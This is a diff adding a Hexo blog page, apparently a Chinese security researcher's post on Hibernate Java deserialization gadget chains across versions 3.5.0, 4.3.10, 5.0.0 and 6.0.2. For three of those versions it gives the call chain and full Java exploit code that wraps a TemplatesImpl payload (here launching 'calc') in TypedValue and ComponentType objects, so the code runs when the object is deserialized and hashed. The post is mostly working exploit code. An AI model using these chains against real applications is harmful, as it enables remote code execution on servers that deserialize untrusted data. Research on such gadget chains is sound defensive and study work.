@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            hibernate 各版本反序列化链
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>参考：<a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-3">https://su18.org/post/ysoserial-su18-3</a></p>
+<h1 id="3-5-0-Final"><a href="#3-5-0-Final" class="headerlink" title="3.5.0-Final"></a>3.5.0-Final</h1><p><code>TypedValue#hashCode</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hibernate-unser/image-20240304170631196.png" alt="image-20240304170631196.png"></p>
+<p>调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypedValue#hashCode</span><br><span class="line">	ComponentType#getHashCode</span><br><span class="line">		ComponentType#getPropertyValues</span><br><span class="line">			PojoComponentTuplizer#getPropertyValues</span><br><span class="line">				AbstractComponentTuplizer#getPropertyValues</span><br><span class="line">					BasiGetter#get</span><br><span class="line">					</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    TemplatesImpl calc = Gadget.getTemplateImpl(&quot;calc&quot;);</span><br><span class="line">    ComponentType componentType = Util.createWithoutConstructor(ComponentType.class);</span><br><span class="line">    TypedValue typedValue = Util.createWithoutConstructor(TypedValue.class);</span><br><span class="line">    EntityEntityModeToTuplizerMapping entityEntityModeToTuplizerMapping = Util.createWithoutConstructor(EntityEntityModeToTuplizerMapping.class);</span><br><span class="line">    PojoComponentTuplizer pojoComponentTuplizer = Util.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line"></span><br><span class="line">    ReflectionOptimizerImpl reflectionOptimizerImpl = Util.createWithoutConstructor(ReflectionOptimizerImpl.class);</span><br><span class="line">    EntityMetamodel entityMetamodel = Util.createWithoutConstructor(EntityMetamodel.class);</span><br><span class="line">    BasicPropertyAccessor.BasicGetter basicGetter = Util.createWithoutConstructor(BasicPropertyAccessor.BasicGetter.class);</span><br><span class="line"></span><br><span class="line">    StandardProperty standardProperty = Util.createWithoutConstructor(StandardProperty.class);</span><br><span class="line">    StandardProperty[] properties = new StandardProperty[]&#123;standardProperty&#125;;</span><br><span class="line"></span><br><span class="line">    Getter[] getters = new Getter[]&#123;basicGetter&#125;;</span><br><span class="line"></span><br><span class="line">    HashMap tuplizers = new HashMap();</span><br><span class="line">    tuplizers.put(EntityMode.POJO,pojoComponentTuplizer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;clazz&quot;, Templates.class);</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;method&quot;, Util.getMethod(Templates.class,&quot;getOutputProperties&quot;,new Class[]&#123;&#125;));</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;propertyName&quot;,&quot;outputProperties&quot;);</span><br><span class="line">    Util.setFieldValue(entityMetamodel,&quot;propertySpan&quot;,1);</span><br><span class="line">    Util.setFieldValue(entityMetamodel,&quot;properties&quot;,properties);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;optimizer&quot;,reflectionOptimizerImpl);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;getters&quot;,getters);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;propertySpan&quot;,1);</span><br><span class="line">    Util.setFieldValue(entityEntityModeToTuplizerMapping,&quot;tuplizers&quot;,tuplizers);</span><br><span class="line">    Util.setFieldValue(componentType,&quot;tuplizerMapping&quot;,entityEntityModeToTuplizerMapping);</span><br><span class="line">    Util.setFieldValue(typedValue,&quot;type&quot;,componentType);</span><br><span class="line">    Util.setFieldValue(typedValue,&quot;value&quot;, calc);</span><br><span class="line">    Util.setFieldValue(typedValue,&quot;entityMode&quot;, EntityMode.POJO);</span><br><span class="line"></span><br><span class="line">    Util.unserialize(Util.serialize(typedValue)).hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-3-0-Final"><a href="#4-3-0-Final" class="headerlink" title="4.3.0.Final"></a>4.3.0.Final</h1><p>这个版本中，ValueHolder无法被序列化。</p>
+<h1 id="4-3-10-Final"><a href="#4-3-10-Final" class="headerlink" title="4.3.10.Final"></a>4.3.10.Final</h1><p><code>TypedValue#hashCode</code>长这样</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hibernate-unser/image-20240304164212171.png" alt="image-20240304164212171.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypedValue#hashCode</span><br><span class="line">	ValueHolder#getValue</span><br><span class="line">		ValueHolder.DeferredInitializer#initialize</span><br><span class="line">            ComponentType#getHashCode</span><br><span class="line">                ComponentType#getPropertyValues</span><br><span class="line">                    PojoComponentTuplizer#getPropertyValues</span><br><span class="line">                        AbstractComponentTuplizer#getPropertyValues</span><br><span class="line">                            BasiGetter#get</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    TemplatesImpl calc = Gadget.getTemplateImpl(&quot;calc&quot;);</span><br><span class="line">    ComponentType componentType = Util.createWithoutConstructor(ComponentType.class);</span><br><span class="line">    PojoComponentTuplizer pojoComponentTuplizer = Util.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">    BasicPropertyAccessor.BasicGetter basicGetter = Util.createWithoutConstructor(BasicPropertyAccessor.BasicGetter.class);</span><br><span class="line"></span><br><span class="line">    Getter[] getters = new Getter[]&#123;basicGetter&#125;;</span><br><span class="line"></span><br><span class="line">    TypedValue typedValue = new TypedValue(componentType,calc);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(componentType,&quot;propertySpan&quot;,1);</span><br><span class="line">    Util.setFieldValue(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;clazz&quot;, Templates.class);</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;method&quot;, Util.getMethod(Templates.class,&quot;getOutputProperties&quot;,new Class[]&#123;&#125;));</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;propertyName&quot;,&quot;outputProperties&quot;);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;getters&quot;,getters);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;propertySpan&quot;,1);</span><br><span class="line"></span><br><span class="line">    Util.unserialize(Util.serialize(typedValue)).hashCode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-0-0-Final"><a href="#5-0-0-Final" class="headerlink" title="5.0.0.Final"></a>5.0.0.Final</h1><p>和上一个版本区别只在Getter的类型属性名变了，其他都没变。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    TemplatesImpl calc = Gadget.getTemplateImpl(&quot;calc&quot;);</span><br><span class="line">    ComponentType componentType = Util.createWithoutConstructor(ComponentType.class);</span><br><span class="line">    PojoComponentTuplizer pojoComponentTuplizer = Util.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">    GetterMethodImpl basicGetter = Util.createWithoutConstructor(GetterMethodImpl.class);</span><br><span class="line"></span><br><span class="line">    Getter[] getters = new Getter[]&#123;basicGetter&#125;;</span><br><span class="line"></span><br><span class="line">    TypedValue typedValue = new TypedValue(componentType,calc);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(componentType,&quot;propertySpan&quot;,1);</span><br><span class="line">    Util.setFieldValue(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;containerClass&quot;, Templates.class);</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;getterMethod&quot;, Util.getMethod(Templates.class,&quot;getOutputProperties&quot;,new Class[]&#123;&#125;));</span><br><span class="line">    Util.setFieldValue(basicGetter,&quot;propertyName&quot;,&quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;getters&quot;,getters);</span><br><span class="line">    Util.setFieldValue(pojoComponentTuplizer,&quot;propertySpan&quot;,1);</span><br><span class="line"></span><br><span class="line">    Util.unserialize(Util.serialize(typedValue)).hashCode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hibernate-unser/image-20240304191904576.png" alt="image-20240304191904576.png"></p>
+<h1 id="6-0-2-Final"><a href="#6-0-2-Final" class="headerlink" title="6.0.2.Final"></a>6.0.2.Final</h1><p>初步构想的链子是这样，可以进入<code>ComponentType#getPropertiesValues</code>，但由于<code>AbstractEntityPersiste</code>r的子类都没实现Serializable，故不行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypedValue#hashCode</span><br><span class="line">	ValueHolder#getValue</span><br><span class="line">		ValueHolder.DeferredInitializer#initialize</span><br><span class="line">			ComponentType#getPropertiesValues</span><br><span class="line">                EntityPersister#getValues</span><br><span class="line">                    AbstractEntityPersister#getValues</span><br><span class="line">                        AbstractEntityPersister#getPropertyValues</span><br><span class="line">                        	Getter#get</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+
+
+</div>
+
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
